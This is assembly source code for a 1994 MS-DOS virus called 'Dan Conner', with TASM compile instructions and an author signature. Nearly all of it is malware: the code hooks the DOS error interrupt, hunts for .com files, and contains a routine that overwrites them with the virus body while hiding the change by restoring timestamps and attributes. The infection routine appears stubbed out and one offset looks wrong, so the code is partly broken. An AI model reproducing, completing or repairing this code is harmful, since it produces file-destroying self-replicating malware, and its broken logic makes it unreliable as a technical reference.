;  Dan Conner written by MuTaTiON INTERRUPT
;  To compile this use TASM /M dan.asm
;---------


code    segment public 'code'
        assume  cs:code
        org     100h                              ; All .COM files start here

start:
        db 0e9h,0,0                               ; Jump to the next command

virus:
        mov     ax,3524h                          ; Get int 24 handler
        int     21h                               ; To ES:BX
        mov     word ptr [oldint24],bx            ; Save it
        mov     word ptr [oldint24+2],es

        mov     ah,25h                            ; Set new int 24 handler
        mov     dx,offset int24                   ; DS:DX->new handler
        int     21h

        push    cs                                ; Restore ES
        pop     es                                ; 'cuz it was changed

        mov     dx,offset comfilespec
        call    findfirst

        mov     ah,9                              ; Display string
        mov     dx,offset virusname
        int     21h

        mov     ax,2524h                          ; Restore int 24 handler
        mov     dx,offset oldint24                ; To original
        int     21h

        push    cs
        pop     ds                                ; Do this because the DS gets changed

        int    20h                                ; quit program

findfirst:
        mov     ah,4eh                            ; Find first file
        mov     cx,7                              ; Find all attributes

findnext:
        int     21h                               ; Find first/next file int
        jc      quit                              ; If none found then change dir

        call    infection                         ; Infect that file

        mov     ah,4fh                            ; Find next file
        jmp     findnext                          ; Jump to the loop

quit:
        ret

infection:
quitinfect:
        ret

FinishInfection:
        xor     cx,cx                             ; Set attriutes to none
        call    attributes

        mov     al,2                              ; open file read/write
        call    open

        mov     ah,40h                            ; Write virus to file
        mov     cx,eof-virus                      ; Size of virus
        mov     dx,100
        int     21h

closefile:
        mov     ax,5701h                          ; Set files date/time back
        push    bx
        mov     cx,word ptr [bx]+16h              ; Get old time from dta
        mov     dx,word ptr [bx]+18h              ; Get old date
        pop     bx
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        xor     cx,cx
        mov     bx,80h
        mov     cl,byte ptr [bx]+15h              ; Get old Attributes
        call    attributes

        retn

open:
        mov     ah,3dh                            ; open file
        mov     dx,80h+30
        int     21h
        xchg    ax,bx                             ; file handle in bx
        ret

attributes:
        mov     ax,4301h                          ; Set attributes to cx
        mov     dx,80h+30
        int     21h
        ret
int24:                                            ; New int 24h (error) handler
        mov     al,3                              ; Fail call
        iret                                      ; Return from int 24 call

Virusname db 'Dan Conner - Anything You Say Dear...',10,13
Author    db 'MuTaTiON INTERRUPT',10,13           ; Author Of This Virus
Made_with db '[NOVEMBER 1994]',10,13              ; Please do not remove this
          db 'Hey: I LOVE ROSEANNE!','$'

comfilespec  db  '*.com',0                        ; Holds type of file to look for

eof     equ     $                                 ; Marks the end of file

oldint24 dd ?                                     ; Storage for old int 24h handler

code    ends
        end     start

